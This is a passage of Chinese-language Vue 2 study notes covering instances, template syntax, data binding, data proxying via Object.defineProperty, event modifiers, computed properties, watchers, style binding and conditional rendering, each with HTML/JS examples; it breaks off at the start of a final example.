# Vue核心

## 2.1初识Vue

- 想让Vue工作，就必须创建一个Vue实例，且要传入一个**配置对象**
- root容器里的代码依然符合HTML规范，只不过混入了一些特殊的Vue语法
- root容器里的代码被称为**Vue模板**
- 真实开发中只有一个Vue实例，并且会配合着组件一起使用；
- {xxx}}中的xxx可以自动读取到data中的相应属性，且xxx写js表达式时会自动执行；
- 例如：{{name.toUpperCase()}} 大写，{{1+1}}输出值为二，{{Date.now()}}获取时间戳
- 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

```js
注意区分：js表达式 和 js代码(语句)

1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
(1). a
(2). a+b
(3). demo(1)
(4). x === y ? 'a' : 'b'

2.js代码(语句)
(1). if(){}
(2). for(){}
```

- Vue实例和模板是**一一对应**的关系，以下两段代码中，均无法正常解析渲染

```js
<div class="root">
        <h1>hello,{{name}}</h1>
</div>

<div class="root">
    <h1>hello,{{name}}</h1>
</div>

<script>
    new Vue({
        el: '.root',
        data: { 
            name:'cez'
        },
        methods: {}
    });
</script>
<div id="root">
        <h1>hello,{{name}},{{address}}</h1>
</div>

<script>
    new Vue({
        el: '#root',
        data: { 
            name:'cez'
        },
        methods: {}
    })
    new Vue({
        el: '#root',
        data: { 
            address:'山东'
        },
        methods: {}
    });
</script>
```

**完全版代码：**

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>初识Vue</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器 -->
	<div id="demo">
		<h1>Hello，{{name.toUpperCase()}}，{{address}}，{{1+1}},{{Date.now()}}</h1>
	</div>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//创建Vue实例
		new Vue({
			el: '#demo', //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。\
			// el:document.getElementById('root'),也可以这么写，但不推荐
			data: { //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
				name: 'zgc',
				address: '北京'
			}
		})
	</script>
</body>
</html>
```

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/600797b2a42b4b4eb18b5b0d0c230179~tplv-k3u1fbpfcp-watermark.awebp)

## 2.2 模板语法

- Vue模板语法有两大类：
  - 插值语法：
    - 功能：用于解析标签体内容
    - 写法：{ { xxx } },xxx是js表达式，且可以直接读取到data中的所有属性
  - 指令语法：
    - 功能：用于解析标签(包括：标签属性、标签体内容、绑定事件…)
    - 举例：v-bind:href="xxx"或省略v-bind，xxx同样要写js表达式，且可以直接读取data中的所有属性，Vue中有很多的指令，且形式都是：v-????，此处只是拿v-bind举例子

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>模板语法</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	
	<!-- 准备好一个容器-->
	<div id="root">
		<h1>插值语法</h1>
		<h3>你好，{{name}}</h3>
		<hr />
		<h1>指令语法</h1>
		<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
		<a :href="school.url" v-bind:x="hello">点我去{{school.name}}学习2</a>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			name: 'zgc',
			school: {
				name: '清华',
				url: 'http://www.atguigu.com',
			},
			hello: '你好'
		}
	})
</script>
</html>
 
```

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0001083b41074ead80c6062adac367c4~tplv-k3u1fbpfcp-watermark.awebp)

## 2.3数据绑定

**Vue有两种数据绑定的方式：**

- 单向绑定(v-bind)：数据只能从data流向页面。
- 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。

**备注：**

- 双向绑定一般都应用在表单类元素上（如：input、select等）
- v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>数据绑定</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<!-- 普通写法 -->
		<!-- 
			单向数据绑定：<input type="text" v-bind:value="name"><br/>
			双向数据绑定：<input type="text" v-model:value="name"><br/>
		     -->

		<!-- 简写 -->
		单向数据绑定：<input type="text" :value="name"><br />
		双向数据绑定：<input type="text" v-model="name"><br />

		<!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上，即有value值的元素，因为其默认与value绑定 -->
		<!-- <h2 v-model:x="name">你好啊</h2> -->
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			name: '尚硅谷'
		}
	})
</script>
</html>
 
```

## 2.4 el与data的两种写法：

```js
data与el的2种写法
	1.el有2种写法
		(1).new Vue时候配置el属性。
		(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
	2.data有2种写法
		(1).对象式
		(2).函数式
	   如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
	3.一个重要的原则：
	   由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
           Vue管理的函数举例：data（），method方法中定义的函数等，this会变成Window
 
```

### el：

> el 属性又称挂载点，可认为是 element 的简写，创建一个 vue实例 得知道是在哪一块元素上创建 Vue实例 ，对哪一块视图进行操作。

```js
1. 设置 el 属性
<div id="app"></div> 
new Vue({ 
  el: "#app", 
  render: h => h(App) 
}) 
2. 使用 $mount 接口
new Vue({
  render: h => h(App) 
}).$mount("#app");

const vm = new Vue({
  render: h => h(App) 
})
vm.$mount("#app");
 
```

### data：

> data 属性又称内部数据，该属性值可以是对象，也可以是函数，但优先推荐使用函数，**对象里的函数又称方法**。并且若是组件中的 data 则必须使用函数。
>
> 优先推荐使用函数的原因是在使用同一个 options 对象作为参数创建多个 Vue实例 时，若 data 属性值为对象，在使用 new Vue(options) 创建 Vue实例 时会将 options.data 属性值直接赋值给 Vue实例.data的属性 ，由于对象的赋值是复制的地址，因此多个实例的 data 属性值都是指向同一个对象的地址，则多个实例会共用一个 data对象，当一个实例改变 data对象 时，另一个实例的 data对象 也会被改变。
>
> 而当 data 属性值为函数时，Vue 创建实例时是会执行该 data() 函数，并将函数执行的结果返回的对象赋值给 Vue实例.data 属性，每次函数执行返回的对象都是不同的对象，因此多个实例的 data 属性值对应的是不同的对象，一个改变不会影响另外一个，各自独立不影响。

```js
1. 使用对象

data:{ n: 0 }

2. 使用函数
//data：function(){ return{ n: 0 } }简写
data(){ //声明data函数时this指向Vue实例，千万不要用箭头函数，其this指向window
  return{ n: 0 } 
}
 
```

## 2.5MVVM

- MVVM:Model-View-ViewModel 是一种软件架构模式

  - M：Model 对应data中的数据
  - V： 视图(View) 模板
  - VM：视图模式(ViewModel) Vue实例对象

- data中所有的属性，最后都出现在了vm身上

- vm身上所有的属性，及Vue原型上所有属性，在Vue模板中都可以直接使用 如`{{$options}} {{$emit}}`均有结果出现。

  ![image-20210717001124214](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0664592a10ab441a9d45607fe6a6ccd2~tplv-k3u1fbpfcp-watermark.awebp)

- ```
  Data Bindings ---数据绑定
  ```
  
- ```
  DOM Listeners ---页面监听
  ```
  
  ![image-20210717001930625](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3579bfe8e979408abc228ecf66e3fcc7~tplv-k3u1fbpfcp-watermark.awebp)

## 2.6 Object.defineProperty()

Vue数据劫持与数据代理，计算属性等都用到了这个方法，必须理解它。

```js
<!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8" />
	<title>回顾Object.defineproperty方法</title>
</head>

<body>

	<script type="text/javascript">
		let number = 18
		let person = {
			name: '张三',
			sex: '男',
		}
		//Object.defineProperty给对象添加属性
		Object.defineProperty(person, 'age', {
			//里面三个参数（对象，属性名，options配置对象{}）
			// value: 18,
			// enumerable: true, //控制属性是否可以枚举（遍历），默认值是false
			// writable:true, //控制属性是否可以被修改，默认值是false
			// configurable:true //控制属性是否可以被删除，默认值是false

			//当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
			get() {
				console.log('有人读取age属性了')
				return number
			},

			//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
			set(value) {
				console.log('有人修改了age属性，且值是', value)
				number = value
			}

		})

		// console.log(Object.keys(person))

		console.log(person)
	</script>
</body>

</html>
 
```

## 2.7 数据代理

### 何为数据代理

```js
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>何为数据代理</title>
	</head>
	<body>
		<!-- 数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）-->
		<script type="text/javascript" >
			let obj = {x:100}
			let obj2 = {y:200}

			Object.defineProperty(obj2,'x',{
				get(){
					return obj.x
				},
				set(value){
					obj.x = value
				}
			})
		</script>
	</body>
</html>
 
```

**可以通过obj2对象操作obj对象中的属性**

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6c6f37c88c7148b6b03a658cb2ad189f~tplv-k3u1fbpfcp-watermark.awebp)

### Vue数据代理

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/71715ee6d13c466ea1997ddcac911455~tplv-k3u1fbpfcp-watermark.awebp) 1.Vue中的数据代理： 通过vm对象来代理data对象中属性的操作（读/写）

2.Vue中数据代理的好处： 更加方便的操作data中的数据，如果没有数据代理，data中所有属性就不能直接调用，前面应该加上 _data.调用

3.基本原理：
 通过Object.defineProperty()把data对象中所有属性代理到vm上。
 为每一个添加到vm上的属性，都指定一个getter/setter。
 在getter/setter内部去操作（读/写）data中对应的属性。

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>Vue中的数据代理</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>

	<!-- 准备好一个容器-->
	<div id="root">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<!-- 如果没有数据代理，代码要这么写，寻找_data中的name属性与address属性，太过繁琐,
                因为vm上没有这两个属性，通过数据代理将这两个属性放在vm身上一份
		<h2>学校名称：{{_data.name}}</h2>
		<h2>学校地址：{{_data.address}}</h2> -->
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		data: {
			name: '尚硅谷',
			address: '宏福科技园'
		}
	})
</script>

</html>
 
```

页面中学校名称原本为尚硅谷，data数据改变后页面内容也就跟着变了 ![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1614ca193432424396cd1a545511f808~tplv-k3u1fbpfcp-watermark.awebp)

## 2.8事件处理

### 事件的基本使用

**事件的基本使用：**
 1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
 2.事件的回调需要配置在methods对象中，最终会在vm上；
 3.methods中配置的函数，不要用箭头函数！否则this就不是vm，而是Window；
 4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
 5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

**exact 修饰符**
 .exact 修饰符允许你控制由精确的系统修饰符组合触发的事件。

```js
<!-- 即使 Alt 或 Shift 被一同按下时也会触发 -->
<button @click.ctrl="onClick">A</button>
 
<!-- 有且只有 Ctrl 被按下的时候才触发 -->
<button @click.ctrl.exact="onCtrlClick">A</button>
 
<!-- 没有任何系统修饰符被按下的时候才触发 -->
<button @click.exact="onClick">A</button>
```

**鼠标按钮修饰符**
 这些修饰符会限制处理函数仅响应特定的鼠标按钮。

```js
.left
.right
.middle
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button v-on:click="showInfo1">点我提示信息1（不传参）</button>
                        <button @click.right="showInfo1">右键点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
                      
                         <!-- 有且只有 ctrl 被按下的时候才触发 -->
                       <button v-on:click.ctrl.exact="showInfo1">A</button>
                        
                        <!-- shift 即使 与（Alt 或 ctrl）  被一同按下时也会触发，即只要有shift就会触发 -->
		        <button v-on:click.shift="showInfo1">A</button>
                       
                        <!-- 没有任何系统修饰符被按下的时候才触发 -->
		        <button v-on:click.exact="showInfo1">A</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{
				showInfo1(event){
                                   //不传参默认收到event事件对象
				  // console.log(event.target.innerText)
				 // console.log(this) //此处的this是vm，可以用this拿到 _data(data)中的数据
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					// console.log(event.target.innerText)
					// console.log(this) //此处的this是vm
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```

### 事件修饰符

**Vue中的事件修饰符**：
 1.prevent：阻止默认事件（常用）；
 2.stop：阻止事件冒泡（常用）；
 3.once：事件只触发一次（常用）；
 4.capture：使用事件的捕获模式；
 5.self：只有event.target是当前操作的元素时才触发事件；
 6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>事件修饰符</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
	<style>
		* {
			margin-top: 20px;
		}

		.demo1 {
			height: 50px;
			background-color: skyblue;
		}

		.box1 {
			padding: 5px;
			background-color: skyblue;
		}

		.box2 {
			padding: 5px;
			background-color: orange;
		}

		.list {
			width: 200px;
			height: 200px;
			background-color: peru;
			overflow: auto;
		}

		li {
			height: 100px;
		}
	</style>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h2>欢迎来到{{name}}学习</h2>
		<!-- 阻止默认事件（常用） -->
		<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

		<!-- 阻止事件冒泡（常用） -->
		<div class="demo1" @click="showInfo">
			<button @click.stop="showInfo">点我提示信息</button>
			<!-- 在哪一层加了阻止事件冒泡，哪一层外面的所有祖先冒泡都会被阻止 -->
			<!-- 修饰符可以连续写 -->
			<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
		</div>

		<!-- 事件只触发一次（常用） -->
		<button @click.once="showInfo">点我提示信息</button>

		<!-- 使用事件的捕获模式 -->
		<div class="box1" @click.capture="showMsg(1)">
			div1
			<div class="box2" @click="showMsg(2)">
				div2
			</div>
		</div>

		<!-- 只有event.target是当前操作的元素时才触发事件； -->
		<div class="demo1" @click.self="showInfo">
			<button @click="showInfo">点我提示信息</button>
		</div>

		<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
		<ul @wheel.passive="demo" class="list">
			<li>1</li>
			<li>2</li>
			<li>3</li>
			<li>4</li>
		</ul>
		<!-- @wheel滚轮滚动事件 @scroll滚动条滚动事件 -->
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			name: '尚硅谷'
		},
		methods: {
			showInfo(e) {
				// e.stopPropagation()//阻止冒泡
				// e.preventDefault()//阻止默认事件
				//可以不用上面两种方法而改用事件修饰符
				alert('同学你好！')
				console.log(e.target)
			},
			showMsg(msg) {
				console.log(msg)
			},
			demo() {
				for (let i = 0; i < 100000; i++) {
					console.log('#')
				}
				console.log('累坏了')
			}
		}
	})
</script>

</html>
```

### 键盘事件

**1.Vue中常用的按键别名**：
 回车 => enter
 删除 => delete (捕获“删除”和“退格”键)
 退出 => esc
 空格 => space
 换行 => tab (特殊，必须配合keydown去使用)
 上 => up
 下 => down
 左 => left
 右 => right

**2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）**

**3.系统修饰键（用法特殊）：tab、ctrl、alt、shift、meta**
 (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
 (2).配合keydown使用：正常触发事件。

**4.也可以使用keyCode去指定具体的按键（不推荐）**

```js
<input type="text" placeholder="按下回车提示输入" @keydown.13="showInfo">
```

**5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名**

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>键盘事件</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h2>欢迎来到{{name}}学习</h2>
		<input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
		<!-- <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo"> -->
		<!--当有需求要同时按下两个键才能生效时 
			<input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo"> -->
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	Vue.config.keyCodes.huiche = 13 //定义了一个别名按键

	new Vue({
		el: '#root',
		data: {
			name: '尚硅谷'
		},
		methods: {
			showInfo(e) {
				// console.log(e.key,e.keyCode)
				// if (e.keyCode !== 13) return 如果不是回车键，则弹出函数
				console.log(e.target.value)
			}
		},
	})
</script>
</html>
```

## 2.9 计算属性（computed）

要求实现下面的小Demo，可以通过计算属性得到全名，但这样无法显示计算属性的优越性，所以我还用了插值语法与methods方法实现，希望对你的理解有帮助。 ![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/76e32426e2184c26a54e35d7d83b01c6~tplv-k3u1fbpfcp-watermark.awebp)

### 姓名案例_插值语法实现

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>姓名案例_插值语法实现</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		姓：<input type="text" v-model="firstName"> <br /><br />
		名：<input type="text" v-model="lastName"> <br /><br />
		全名：<span>{{firstName.slice(0,3)}}-{{lastName}}</span>
		<!-- 要求截取前三位，还可以在{{}}添加更多需求，但是十分不推荐，应该尽量简洁 -->
		<!-- 全名：<span>{{firstName+ '-' +lastName}}</span> -->
	</div>
</body>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			firstName: '张',
			lastName: '三'
		}
	})
</script>
</html>
 
```

### 姓名案例_methods实现

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>姓名案例_methods实现</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
	<!-- 准备好一个容器-->
	<div id="root">
		姓：<input type="text" v-model="firstName"> <br /><br />
		名：<input type="text" v-model="lastName"> <br /><br />
		全名：<span>{{fullName()}}</span>
                //fullName带括号表示将函数的返回值展示出来
	</div>
</body>
<!-- data中的数据发生改变，vue模板会重新解析，对data重新读取，如果有在模板里面调方法，方法也会重新被调用 -->
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			firstName: '张',
			lastName: '三'
		},
		methods: {
			fullName() {
				console.log('@---fullName')
				return this.firstName + '-' + this.lastName
			}
		},
	})
</script>
</html>
 
```

### 姓名案例_计算属性实现

> vue将data中的数据视为属性

**计算属性：**
 **1.定义：** 要用的属性不存在，要通过已有属性(Vue实例中的属性)计算得来。
 **2.原理：** 底层借助了Object.defineproperty方法提供的getter和setter。
 **3.get函数什么时候执行？**
 (1).初次读取时会执行一次。
 (2).当依赖的数据发生改变时会被再次调用。
 **4.优势：** 与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
 **5.备注：**
 1.计算属性最终会出现在vm上，直接读取使用即可。不能写fullName.get（），没有这种写法。
 2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>姓名案例_计算属性实现</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		姓：<input type="text" v-model="firstName"> <br /><br />
		名：<input type="text" v-model="lastName"> <br /><br />
		测试：<input type="text" v-model="x"> <br /><br />
		全名：<span>{{fullName}}</span> <br /><br />
		全名：<span>{{fullName}}</span> <br /><br />
		全名：<span>{{fullName}}</span> <br /><br />
		全名：<span>{{fullName}}</span>
		<!-- 多个fullName初始只会调用一次get（），因为缓存了 ，用methods方法调用没有缓存-->
	</div>
</body>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		data: {
			firstName: '张',
			lastName: '三',
			x: '你好'
		},
		computed: {
			fullName: {
			   //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
			  //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
				get() {
					console.log('get被调用了')
					console.log(this) //此处的this是vm
					return this.firstName + '-' + this.lastName
				},
				//set什么时候调用? 当fullName被修改时。
				set(value) {
					console.log('set', value)
					const arr = value.split('-')
					// 用-做分隔符,将其变为数组
					this.firstName = arr[0]
					this.lastName = arr[1]
                                        //可以用vm.fullName = '李-四'更改fullname的值
				}
                                //在多数情况下只考虑读取不考虑修改，可以把set部分删掉，简写
                                // fullName(){
				//	console.log('get被调用了')
				//	return this.firstName + '-' + this.lastName
				//}
                                //注意上方模板{{}}中依然放fullName，不带括号。
			}
		}
	})
</script>
</html>
 
```

## 2.10监视属性（侦听器watch）

### 天气案例-监视属性

**监视属性watch**：
 1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
 2.监视的属性必须存在，才能进行监视！！
 3.监视的两种写法：
 (1).new Vue时传入watch配置
 (2).通过vm.$watch监视

**深度监视**：
 (1).Vue中的watch默认不监测对象内部值的改变（一层）。
 (2).配置deep:true可以监测对象内部值改变（多层）。
 **备注**：
 (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
 (2).使用watch时根据数据的具体结构，决定是否采用深度监视。

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>天气案例_监视属性</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<h2>今天天气很{{info}} {{x}}</h2>
		<!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句
		比如下面两句功能相同，但是要记住模板里面找数据从vm内找，有些语句放入报错 -->
		<button @click="isHot = !isHot;x++">切换天气</button>
		<button @click="changeWeather">切换天气</button>
                <hr />
		深度监视按钮：
		<h3>a的值是:{{numbers.a}}</h3>
		<button @click="numbers.a++">点我让a+1</button>
		<h3>b的值是:{{numbers.b}}</h3>
		<button @click="numbers.b++">点我让b+1</button>
		{{numbers.c.d.e}}
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		data: {
			isHot: true,
			x: 0,
			numbers: {
				a: 1,
				b: 1,
				c: {
					d: {
						e: 100
					}
				}
			}
		},
		computed: {
			info() {
				return this.isHot ? '炎热' : '凉爽'
			}
		},
		methods: {
			changeWeather() {
				this.isHot = !this.isHot
				this.x++
			}
		},
		// 方法一
		/* watch:{
			isHot:{
				immediate:true, //初始化时让handler调用一下
				//handler什么时候调用？当isHot发生改变时。
				handler(newValue,oldValue){
					console.log('isHot被修改了',newValue,oldValue)
				}
			}
		} 
		//简写：不用immediate:true，deep: true等属性时可以简写
			// isHot(newValue, oldValue) {
			// 	console.log('isHot被修改了', newValue, oldValue, this)
			// }
		
		*/

		//深度监视：
		//监视多级结构中某个属性的变化，注意带引号
		/* 'numbers.a':{
			handler(){
				console.log('a被改变了')
			}
		} 
		但如果多级结构中属性太多的话太过繁琐
		*/
		//监视多级结构中所有属性的变化
		numbers: {
			deep: true,//deep开启深度监视，不开启的话只监视numbers变化，不能看到numbers内的数据变化
			handler() {
				console.log('numbers改变了')
			}
		}
	})
	// 方法二
	vm.$watch('isHot', {//注意带引号
		immediate: true, //初始化时让handler调用一下
		//handler什么时候调用？当isHot发生改变时。
		handler(newValue, oldValue) {
			console.log('isHot被修改了', newValue, oldValue)
		}
	})
//简写
// vm.$watch('isHot', function (newValue, oldValue) {
// 		console.log('isHot被修改了', newValue, oldValue, this)
// 	})
</script>

</html>
 
```

### 姓名案例_watch实现

**通过watch实现的姓名案例与上方计算属性实现的姓名案例比较:**

**computed和watch之间的区别**：

1. computed能完成的功能，watch都可以完成。
2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。computed不可以，因为computed依赖返回值得到结果。而watch则是得到属性改变的结果。

**两个重要的小原则**：

1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。

```js
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>姓名案例_watch实现</title>
	<!-- 引入Vue -->
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		姓：<input type="text" v-model="firstName"> <br /><br />
		名：<input type="text" v-model="lastName"> <br /><br />
		全名：<span>{{fullName}}</span> <br /><br />
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		data: {
			firstName: '张',
			lastName: '三',
			fullName: '张-三'
		},
		watch: {
			//简写
			firstName(newValue) {
				setTimeout(() => {
					console.log(this)
					this.fullName = newValue + '-' + this.lastName
				}, 1000);
			},
			lastName(newValue) {
				this.fullName = this.firstName + '-' + newValue
			}
		}
	})
</script>

</html>
 
```

## 2.11绑定样式

**绑定样式：**

### 1. class样式

```
写法:class="xxx" xxx可以是字符串、对象、数组。
	字符串写法适用于：类名不确定，要动态获取。
	数组写法适用于：要绑定多个样式，个数不确定，名字也不确定。
	对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
 
```

### 2. style样式

```html
	:style="{fontSize: xxx}"其中xxx是动态值。
	:style="[a,b]"其中a、b是样式对象。
 
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8" />
	<title>绑定样式</title>
	<style>
		.basic {
			width: 400px;
			height: 100px;
			border: 1px solid black;
		}

		.happy {
			border: 4px solid red;
			;
			background-color: rgba(255, 255, 0, 0.644);
			background: linear-gradient(30deg, yellow, pink, orange, yellow);
		}

		.sad {
			border: 4px dashed rgb(2, 197, 2);
			background-color: gray;
		}

		.normal {
			background-color: skyblue;
		}

		.atguigu1 {
			background-color: yellowgreen;
		}

		.atguigu2 {
			font-size: 30px;
			text-shadow: 2px 2px 10px red;
		}

		.atguigu3 {
			border-radius: 20px;
		}
	</style>
	<script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
	<!-- 准备好一个容器-->
	<div id="root">
		<!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
		<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br /><br />

		<!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
		<div class="basic" :class="classArr">{{name}}</div> <br /><br />

		<!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
		<div class="basic" :class="classObj">{{name}}</div> <br /><br />

		<!-- 绑定style样式--对象写法 -->
		<div class="basic" :style="styleObj">{{name}}</div> <br /><br />
		<!-- 绑定style样式--数组写法 -->
		<div class="basic" :style="styleArr">{{name}}</div>
	</div>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false

	const vm = new Vue({
		el: '#root',
		data: {
			name: '我要进大厂',
			mood: 'normal',
			classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
			classObj: {
				atguigu1: true,
				atguigu2: false,
			},
			styleObj: {
				fontSize: '40px',
				color: 'red',
			},
			styleObj2: {
				backgroundColor: 'orange'
			},
			styleArr: [
				{
					fontSize: '40px',
					color: 'blue',
				},
				{
					backgroundColor: 'gray'
				}
			]
		},
		methods: {
			changeMood() {
				//随机切换心情
				const arr = ['happy', 'sad', 'normal']
				const index = Math.floor(Math.random() * 3)
				//Math.random()	返回 0 ~ 1 之间的随机数，包含 0 不包含 1。
				//Math.floor(x)	对 x 进行下舍入，即向下取整。
				this.mood = arr[index]
			}
		},
	})
</script>
</html>
 
```

## 2.12条件渲染

**条件渲染：**

### 1.v-if

```
写法：
(1).v-if="表达式" 
(2).v-else-if="表达式"
(3).v-else="表达式"
适用于：切换频率较低的场景。
特点：不展示的DOM元素直接被移除。
 
```

**注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。**

### 2.v-show

```
	写法：v-show="表达式"
	适用于：切换频率较高的场景。
	特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉，display：none								
 
```

**3.备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。**

```js
<!DOCTYPE html>
<html>

<head>
	<meta charset="UTF-8" />
